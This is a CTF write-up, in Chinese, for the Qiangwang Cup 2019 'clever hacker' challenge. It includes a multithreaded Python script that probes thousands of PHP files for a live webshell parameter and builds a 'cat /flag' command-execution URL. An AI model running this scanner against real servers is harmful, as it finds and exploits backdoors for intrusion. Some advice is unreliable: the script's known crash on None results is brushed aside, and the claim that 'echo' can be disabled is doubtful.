# [强网杯 2019]高明的黑客

## 题目描述
- **提示**：无
- **考点**：Python脚本的编写、WebShell的使用、异常处理与容错

## 解题思路（我的思考过程）
1. **信息收集**：访问首页，下载`www.tar.gz`，解压后发现`src`目录下存在 3000 多个随机命名的`.php文件`。
2. **源码分析**：随便打开几个文件，发现代码结构高度相似，都是类似`eval($_GET['随机参数'] ?? '')` 或 `assert(...)`的写法。出题人故意生成了海量假后门，视图通过"代码海洋"让人工审计奔溃。
3. **破局思路**：编写Python脚本，提取本地所有文件的参数名，批量向靶机发送测试 payload 。
4. **自动化扫描**：脚本遍历本地源码，用正则提取`GET/POST`参数，向靶机发送`echo "hello_world";`。
5. **锁定目标拿Flag**：脚本跑出唯一的后门（如 `xk0SzyKwfzw.php?Efa5BVG=`），直接构造命令执行 payload 读取 '/flag'。

## 核心技巧沉淀（最重要）
- **正则提取参数**：使用正则表达式 `eval\(\$_(GET|POST)\[['\"](.*?)['\"]\]\)` 可以从海量混淆代码中精准剥离出文件名和参数名。
- **多线程并发请求**：面对几千个文件，单线程发包太慢。使用 Python 的 `threading` 模块或 `concurrent.futures` 开启多线程（如 50 线程），几分钟内即可扫完。
- **回显特征测试**：测试 Payload 建议用 `print('hello_world_test');` 而不是 `echo`，因为部分 PHP 环境可能禁用了 `echo`，但 `print` 或 `var_dump` 往往还能用。
- **遇到报错别慌**：如果脚本在最后输出结果时报 `TypeError` 崩溃，只要它崩溃前打印出了“找到可用 WebShell”的绿字，就说明核心目的已经达到，可以直接手工去拿 Flag。

## 常用命令 / payload
```bash
import os
import re
import requests
import threading
import time

# 配置
FILE_PATH = r"D:\chrome浏览器\CTF文件下载\www\src"  # 改成你解压后的 src 目录
TARGET_URL = "http://d8a7c6a74e9b2fecaf3100b5.http-ctf2.dasctf.com/"     # 靶机地址
THREAD_NUM = 50                     # 线程数

# 遍历并测试每个文件
def test_file(file_name):
    # 读取文件内容，提取所有 GET 和 POST 参数名
    with open(os.path.join(FILE_PATH, file_name), encoding='utf-8', errors='ignore') as f:
        content = f.read()
    gets = re.findall(r"\$_GET\['(.*?)'\]", content)
    posts = re.findall(r"\$_POST\['(.*?)'\]", content)

    url = TARGET_URL + file_name

    # 一次性发送所有 GET 和 POST 参数进行测试
    params = {g: "echo 'hello_world';" for g in gets}
    data = {p: "echo 'hello_world';" for p in posts}

    try:
        r = requests.post(url, params=params, data=data, timeout=3)
        if "hello_world" in r.text:
            # 如果成功，再逐个测试，确定具体是哪个参数
            for g in gets:
                r_test = requests.get(url, params={g: "echo 'hello_world';"}, timeout=3)
                if "hello_world" in r_test.text:
                    print(f"[+] 找到可用 WebShell: {file_name}，参数: {g} (GET)")
                    return (file_name, g, "GET")
            for p in posts:
                r_test = requests.post(url, data={p: "echo 'hello_world';"}, timeout=3)
                if "hello_world" in r_test.text:
                    print(f"[+] 找到可用 WebShell: {file_name}，参数: {p} (POST)")
                    return (file_name, p, "POST")
    except Exception:
        pass
    return None

# 多线程执行
files = os.listdir(FILE_PATH)
results = []
threads = []
for f in files:
    t = threading.Thread(target=lambda f=f: results.append(test_file(f)))
    t.start()
    threads.append(t)
    if len(threads) >= THREAD_NUM:
        for t in threads: t.join()
        threads = []

for t in threads: t.join()

# 输出最终结果
if results:
    file_name, param, method = results[0]
    print(f"\n[+] 成功！可用文件: {file_name}，参数: {param}，方法: {method}")
    print(f"[+] 命令执行测试: {TARGET_URL}{file_name}?{param}=cat%20/flag")
else:
    print("[-] 未找到可用 WebShell，请检查路径或网络。")
```
